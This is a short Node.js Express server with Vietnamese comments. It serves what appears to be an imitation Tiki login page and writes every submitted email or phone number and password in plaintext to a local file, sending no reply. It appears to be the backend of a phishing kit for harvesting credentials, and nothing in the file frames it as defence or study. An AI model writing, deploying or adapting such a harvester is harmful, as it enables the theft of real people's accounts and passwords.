const express = require("express");
const fs = require("fs");
const bodyParser = require("body-parser");
const path = require("path");
const app = express();
const port = 3000;

// Middleware để parse JSON và x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Route POST xử lý đăng nhập
app.post("/login", (req, res) => {
  const { emailOrPhone, password } = req.body;

  // Kiểm tra xem các giá trị có hợp lệ không
  if (!emailOrPhone || !password) {
    return res.status(400).send("Vui lòng nhập đủ thông tin.");
  }

  // Lưu thông tin vào file login_data.txt
  const logData = `Email/Số điện thoại: ${emailOrPhone}\nMật khẩu: ${password}\n-----------------------------\n`;

  fs.appendFile("login_data.txt", logData, (err) => {
    if (err) {
      console.error("Lỗi khi lưu thông tin:", err); // Để log lỗi trên server nếu có
    }
    // Không trả về bất kỳ phản hồi nào sau khi lưu thông tin
  });
});

// Route mặc định trả về tệp tikilogin.html từ đường dẫn tuyệt đối
app.get("/", (req, res) => {
  const htmlPath = path.join("D:", "Ảnh", "moi", "tritrung", "tikilogin.html"); // Đường dẫn tuyệt đối đến tệp tikilogin.html
  res.sendFile(htmlPath); // Trả về tệp HTML từ đường dẫn tuyệt đối
});

// Chạy server trên port 3000
app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
